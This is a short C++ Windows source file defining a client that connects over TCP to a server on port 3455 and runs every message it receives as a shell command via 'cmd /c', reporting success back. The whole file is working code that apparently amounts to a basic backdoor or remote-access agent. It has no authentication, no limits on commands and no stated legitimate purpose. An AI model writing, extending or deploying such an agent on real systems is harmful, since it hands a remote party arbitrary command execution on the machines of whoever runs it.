#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <thread>

using namespace std;

class Client {
    SOCKET clientSock;
    WSADATA wsa;
    struct sockaddr_in serverInfo;
    bool isConnected = false;

public:
    void StartClient(std::string serverAddr);
    bool ConnectToServer();
    void ReceiveCommands();
};

void Client::StartClient(std::string serverAddr) {
  serverInfo.sin_family = AF_INET;
  serverInfo.sin_port = htons(3455);
  serverInfo.sin_addr.s_addr = inet_addr(serverAddr.c_str());

  printf("\nInitializing Winsock...");
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    printf("Failed. Error Code: %d\n", WSAGetLastError());
    return;
  }
  printf("Initialized.\n");

  if ((clientSock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      perror("Failed to open socket.");
      WSACleanup(); // Clean up Winsock
      return;
  }

  int opt = 1;
  if (setsockopt(clientSock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0) {
      perror("Error setting SO_REUSEADDR");
      closesocket(clientSock);
      WSACleanup();
      return;
  }

  printf("Socket opened. Connecting to server...\n");
  if (ConnectToServer()) {
    std::thread obj([this](){ this->ReceiveCommands(); });
    obj.join();
  }
}

bool Client::ConnectToServer() {
  int count = 0;

  while (!isConnected) {
      if (connect(clientSock, (struct sockaddr*)&serverInfo, sizeof(serverInfo)) == 0) {
        isConnected = true;
        printf("[+] Connected to server.\n");
        return true;
      } else if (count == 10) {
        printf("Failed to connect to the server.\n"); break;
      } else {
        count++;
        printf("Connection failed. Retrying...\n");
        std::this_thread::sleep_for(std::chrono::seconds(1)); // Wait before retrying
      }
  }
  return false;
}

void Client::ReceiveCommands() {
  while (isConnected) {
    char buffer[1024];
    int bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0);

    if (bytesReceived < 0) {
	      perror("Error receiving data from Server");
	      isConnected = false;
	      break;
    } else if (bytesReceived == 0) {
	      isConnected = false;
	      cout << "Disconnected from the server." << endl;
	      break;
    } else {
	      buffer[bytesReceived] = '\0'; // Null-terminate the received data
	      cout << "Received from Server: " << buffer << endl;

	      std::wstring command(buffer, buffer + strlen(buffer));
	      std::wstring completeCommand = L"cmd /c " + command;
	      int res = _wsystem(completeCommand.c_str());

	      const char* success = "Command was successfully executed.";
	      if (res == 0) send(clientSock, success, strlen(success), 0);
	  }
 }

  closesocket(clientSock);
  WSACleanup();
}